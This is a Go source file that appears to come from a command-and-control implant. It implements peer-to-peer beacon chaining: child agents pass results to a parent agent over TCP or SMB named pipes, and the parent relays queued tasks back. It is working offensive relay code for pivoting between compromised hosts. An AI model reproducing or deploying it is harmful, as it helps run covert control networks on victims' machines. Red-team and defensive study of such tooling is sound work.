//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

// p2pCleanupStaleChildren prunes child UUIDs/results/tasks not seen in 10 minutes.
func p2pCleanupStaleChildren() {
	for {
		time.Sleep(5 * time.Minute)
		p2pRelayMu.Lock()
		cutoff := time.Now().Add(-10 * time.Minute)
		keep := make([]string, 0, len(p2pChildUUIDs))
		for _, uuid := range p2pChildUUIDs {
			if last, ok := p2pChildLastSeen[uuid]; ok && last.After(cutoff) {
				keep = append(keep, uuid)
			} else {
				delete(p2pChildResults, uuid)
				delete(p2pChildAcks, uuid)
				delete(p2pChildTasks, uuid)
				delete(p2pChildLastSeen, uuid)
			}
		}
		p2pChildUUIDs = keep
		p2pRelayMu.Unlock()
	}
}

// ?? P2P Beacon Chaining ????????????????????????????????????????????????????????????

// sendP2PBeacon sends beacon request to parent agent via TCP or Named Pipe
func sendP2PBeacon(body []byte) []byte {
	if strings.HasPrefix(P2PParent, "pipe://") {
		return sendP2PSMBBeacon(body)
	}
	return sendP2PTCPBeacon(body)
}

func sendP2PTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(P2PParent, "tcp://")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP dial to %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

// p2pParentListen accepts child agent connections in a loop
func p2pParentListen() {
	if P2PMode == "smb" {
		p2pListenSMB()
	} else if P2PMode == "tcp" {
		p2pListenTCP()
	}
}

func p2pListenTCP() {
	ln, err := net.Listen("tcp", P2PListenAddr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

func p2pHandleChild(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// Read request length + body
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return
	}
	body := make([]byte, rlen)
	if _, err := io.ReadFull(conn, body); err != nil {
		return
	}

	var req BeaconRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return
	}

	// Identify child by UUID
	childID := req.UUID
	if childID == "" {
		return
	}

	// Store relayed results
	p2pRelayMu.Lock()
	isNew := true
	for _, uuid := range p2pChildUUIDs {
		if uuid == childID {
			isNew = false
			break
		}
	}
	if isNew {
		p2pChildUUIDs = append(p2pChildUUIDs, childID)
	}
	p2pChildLastSeen[childID] = time.Now()
	if len(req.Results) > 0 {
		p2pChildResults[childID] = append(p2pChildResults[childID], req.Results...)
	}
	if len(req.AckTaskIDs) > 0 {
		p2pChildAcks[childID] = append(p2pChildAcks[childID], req.AckTaskIDs...)
	}
	// Check if there are any pending tasks for this child
	tasksForChild := p2pChildTasks[childID]
	delete(p2pChildTasks, childID)
	p2pRelayMu.Unlock()

	// Build response with tasks for this child
	resp := BeaconResponse{
		Tasks: tasksForChild,
	}

	respBody, _ := json.Marshal(resp)

	// Write response back to child
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	binary.Write(conn, binary.BigEndian, uint32(len(respBody)))
	conn.Write(respBody)
}
